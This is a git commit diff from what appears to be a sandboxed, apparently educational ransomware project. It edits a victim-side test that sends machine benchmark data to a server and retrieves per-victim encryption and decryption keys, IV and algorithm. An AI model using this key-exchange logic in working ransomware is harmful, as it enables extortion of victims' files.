9028ee52b45042ecc8b52db862c50e35f8efb6f4
leJBP <jb.prevost62@gmail.com>
2024-06-07 15:13:01 -0400

    récupération clés chiffrement et déchiffrement ok

--- victim/tests/test_connection.c
+++ victim/tests/test_connection.c
@@ -15,7 +15,7 @@ int main(int argc, char const *argv[])
     char* paths[] = {"/tmp/sandbox-ransomware/"};
     char* p_algo = NULL;
     char* p_iv = NULL;
-    char* id = "45565555555";
+    char* id = "8";
 
     /* Initialisation de la structure pour la recherche de fichier */
     listFileData* p_listFileData = init_list_file_data();
@@ -29,15 +29,20 @@ int main(int argc, char const *argv[])
     /* Envoi du benchmark au serveur */
     benchmarkData* p_benchmarkData = benchmark_pc(p_listFileData->totalSize);
 
-    p_benchmarkData->memorySize = 1000;
-    p_benchmarkData->dataSize = 99999999999999999;
-    p_benchmarkData->cpuCore = 4;
+    p_benchmarkData->memorySize = 8000;
+    p_benchmarkData->dataSize = 2000;
+    p_benchmarkData->cpuCore = 16;
 
     char* p_key = get_encryption_key(id, p_benchmarkData, &p_algo, &p_iv);
 
     printf("key: %s\n", p_key);
     printf("iv: %s\n", p_iv);
     printf("Algo: %s\n", p_algo);
+
+    /* Free for decryption key data */
+    free(p_key);
+    free(p_iv);
+    free(p_algo);
 
     p_key = get_decryption_key(id, &p_algo, &p_iv);
 
